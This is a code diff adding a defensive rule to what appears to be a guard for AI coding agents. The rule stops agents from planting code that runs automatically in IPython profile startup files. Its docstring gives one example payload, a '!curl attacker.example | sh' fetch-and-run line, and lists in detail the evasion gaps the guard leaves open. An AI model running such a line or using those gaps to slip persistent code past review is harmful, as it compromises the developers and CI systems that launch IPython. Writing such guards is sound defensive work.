@@ -3806,6 +3806,187 @@ def rule_pysite_protect(ev: Event, policy=None) -> Optional[Decision]:
     return None
 
 
+def _ipython_startup_allowed_by_policy(cfg: dict, text: str) -> bool:
+    for pat in (cfg.get("allow") or []):
+        try:
+            if re.search(str(pat), text, re.IGNORECASE):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+def rule_ipython_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Block planting an IPython profile-startup auto-exec shape: a
+    module-level process/code-exec call in a `.ipython/profile_*/startup/`
+    `.py`/`.ipy` file, or -- `.ipy` only, where IPython's own input
+    transformer makes it real syntax -- a bare `!<command>` shell-escape
+    line.
+
+    THREAT MODEL: IPython's `InteractiveShell` runs every file inside the
+    ACTIVE profile's `startup/` directory, unconditionally, sorted by
+    filename, on EVERY IPython startup -- a plain `ipython` invocation, a
+    Jupyter kernel launch (notebook, lab, qtconsole, `jupyter console`), or
+    anything else that boots an `InteractiveShell` -- no opt-in, no
+    explicit import, no CLI flag, no git/CI/session-restart trigger. For a
+    data-science/notebook project, that startup is routine and frequent --
+    often the very next command a human or this agent runs in the same
+    session, the same "no future trigger, the very next bare invocation"
+    property `rule_path_hijack_protect`'s own docstring highlights as
+    unique among most of this file's other guards; this guard shares it for
+    the analogous reason (an interpreter startup, like a bare command
+    invocation, needs no git op/CI push/new shell/`cd`).
+
+    This is the IPython-layer analog of `rule_pysite_protect`'s own
+    `sitecustomize.py`/`usercustomize.py` mechanism, one layer up: CPython's
+    `site` module runs those unconditionally on every bare interpreter
+    startup; IPython's own startup mechanism runs every file in its
+    profile's `startup/` directory unconditionally on every IPython/Jupyter
+    startup. Neither `rule_pysite_protect` nor any other guard in this file
+    reaches it -- `PYSITE_CUSTOMIZE_PATH_RE` gates `sitecustomize.py`/
+    `usercustomize.py` as bare filenames with no directory restriction, so a
+    same-shaped payload under a DIFFERENT filename inside
+    `.ipython/profile_*/startup/` never matches it; `rule_conftest_protect`
+    gates pytest's own auto-import mechanism, not IPython's.
+
+    Two file kinds live in that directory and are handled differently, the
+    same "gate the SHAPE, not the bare file" trade-off
+    `pysite_customize_dangerous_hit` already makes for
+    `sitecustomize.py`/`usercustomize.py`:
+
+    1. A `.py` file executes as plain Python -- the ordinary
+       `os.system`/`subprocess.*`/`eval`/`exec`/network-call vocabulary
+       `_CONFTEST_EXEC_CALL` already gates, reused here unchanged.
+
+    2. A `.ipy` file is parsed with IPython's own input transformers first,
+       so IPython "magics" work inside it -- including the bare
+       `!<command>` shell-escape syntax and the `get_ipython().system(...)`/
+       `.getoutput(...)`/`.run_line_magic(...)`/`.run_cell_magic(...)` API
+       forms. A bare `!curl attacker.example | sh` line is syntactically
+       invalid plain Python (so it can never appear in a working `.py`
+       file) but a complete, self-contained shell-exec payload in a `.ipy`
+       file -- no `os`/`subprocess` import needed at all. This guard's
+       bang-line check is gated on the matched path actually ending in
+       `.ipy`, so an ordinary `.py` startup file with a `#`-commented-out
+       stray `!` character (inert either way) is never flagged by it.
+
+    Deliberately NOT gated on any `.ipython/profile_*/startup/` write at
+    all: those files legitimately hold benign, routine setup (import
+    aliases, matplotlib backend selection, display-format tweaks) with no
+    process/code-exec call in sight -- gating on the bare file alone would
+    flag those on sight, the same false-positive trade-off every sibling
+    content-gated guard in this file (`rule_conftest_protect`,
+    `rule_pysite_protect`, `rule_package_manifest_protect`,
+    `rule_devcontainer_exec_protect`, `rule_claude_hooks_protect`) already
+    discloses and avoids the same way.
+
+    Config (`policy.ipython_startup`): `mode` (deny|ask|monitor|off,
+    default ask), `allow` (regexes on the path/command that skip the
+    gate). Defaults to `ask` for the same reason every sibling `*_protect`
+    guard does: a legitimate, sanctioned startup hook (a controlled
+    plotting/logging shim that does shell out) can exist -- it just needs a
+    human to have actually looked at it once.
+
+    Escapable only by a human: a trailing '# aegis-allow' on the shell
+    form, or the env toggle `AEGIS_ALLOW_IPYTHON_STARTUP=1` set by the
+    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
+    spawned agent cannot set its own env for a hook invocation it doesn't
+    control, so neither path is agent-self-escapable.
+
+    Honest scope, the same denylist trade-offs every guard in this file
+    discloses: a dangerous call assembled indirectly (string concatenation,
+    an aliased import, a wrapper function) rather than appearing as a
+    literal defeats every check here, the same class every sibling guard
+    already accepts; `find`-path indirection around the `startup/`
+    directory isn't covered (no `*_find_hit`-style fallback, the same gap
+    `rule_package_manifest_protect`/`rule_direnv_protect`/
+    `rule_conftest_protect` already disclose for their own targets); a
+    direct fetch-to-file write (`curl -o .../startup/00-x.py ...`) is
+    caught by none of the shell branch's write-verb checks, the same
+    inherited gap every other guard in this file already discloses; an
+    `IPYTHONDIR` relocation of where IPython looks for profiles is not
+    specially covered -- the same "computed indirectly" class
+    `rule_shell_persist_protect`'s own `$ZDOTDIR` gap already accepts; the
+    profile-name segment (`profile_[\\w.\\-]+`) is unrestricted (any name
+    `ipython --profile=<name>` can create), which is deliberately broad
+    rather than curated to `profile_default`, but also means it has no
+    upper bound on plausible false matches from an unrelated project that
+    happens to nest a `profile_x/startup/` directory structure elsewhere
+    for its own reasons -- not observed in practice, disclosed as a
+    theoretical trade-off; and the shared `_path()` helper every
+    `*_protect` guard in this file reads MCP tool-call arguments through
+    only checks top-level argument keys, the same pre-existing,
+    shared-infrastructure gap `rule_pysite_protect`'s own docstring already
+    discloses and does not fix per-guard."""
+    cfg = getattr(policy, "ipython_startup", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    def _finish(would: Decision) -> Optional[Decision]:
+        if mode == "monitor":
+            _record_monitor(ev, would, "ipython-startup-protect-monitor")
+            return None
+        return would
+
+    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
+        p = _path(ev)
+        a = ev.args or {}
+        literal = a.get("content") or a.get("new_string")
+        content = literal if isinstance(literal, str) and literal else "\n".join(_flatten_strings(a))
+        if not p or not content:
+            return None
+        if not patterns.IPYTHON_STARTUP_PATH_RE.search(p):
+            return None
+        is_ipy = bool(patterns.IPYTHON_IPY_EXT_RE.search(p))
+        if not patterns.ipython_startup_dangerous_hit(content, is_ipy=is_ipy):
+            return None
+        if (os.environ.get("AEGIS_ALLOW_IPYTHON_STARTUP")
+                or _ipython_startup_allowed_by_policy(cfg, p)):
+            return None
+        return _finish(Decision(action, "ipython-startup-protect",
+                         f"'{p}' is being written with an IPython "
+                         "profile-startup auto-exec shape -- IPython runs "
+                         "every file in the active profile's `startup/` "
+                         "directory unconditionally on the very next "
+                         "`ipython`/Jupyter-kernel launch, by this agent, "
+                         "a teammate, or CI, with no further action "
+                         "needed. Review the change, then confirm with "
+                         "AEGIS_ALLOW_IPYTHON_STARTUP=1; a spawned agent "
+                         "cannot."))
+
+    if _is_shell(ev):
+        cmd = _shell_scan(ev)
+        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
+                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
+                           or patterns.INPLACE_WRITE_RE.search(cmd)
+                           or patterns.FORCED_LINK_WRITE_RE.search(cmd)
+                           or patterns.COPY_WRITE_VERB_RE.search(cmd))
+        if not write_verb:
+            return None
+        if not patterns.IPYTHON_STARTUP_PATH_RE.search(cmd):
+            return None
+        is_ipy = bool(patterns.IPYTHON_IPY_EXT_RE.search(cmd))
+        if not patterns.ipython_startup_dangerous_hit(cmd, is_ipy=is_ipy,
+                                                        shell=True, raw=_cmd(ev)):
+            return None
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_IPYTHON_STARTUP")
+                or _ipython_startup_allowed_by_policy(cfg, _cmd(ev))):
+            return None
+        return _finish(Decision(action, "ipython-startup-protect",
+                         "An IPython profile-startup auto-exec shape is "
+                         "being planted from a shell -- IPython runs it on "
+                         "the very next `ipython`/Jupyter-kernel launch, "
+                         "by this agent, a teammate, or CI, with no "
+                         "further action needed. A human may append "
+                         "'# aegis-allow', or set "
+                         "AEGIS_ALLOW_IPYTHON_STARTUP=1; a spawned agent "
+                         "cannot."))
+    return None
+
+
 # ---- workspace confinement: opt-in, file-mutation tools ----------------------
 def _within(path: str, root: str) -> bool:
     return path == root or path.startswith(root + os.sep)
@@ -4218,6 +4399,7 @@ _CORE_RULES = (
     rule_claude_hooks_protect,
     rule_conftest_protect,
     rule_pysite_protect,
+    rule_ipython_startup_protect,
     rule_workspace_confine,
     rule_migration_protection,
     rule_subagent_spawn,
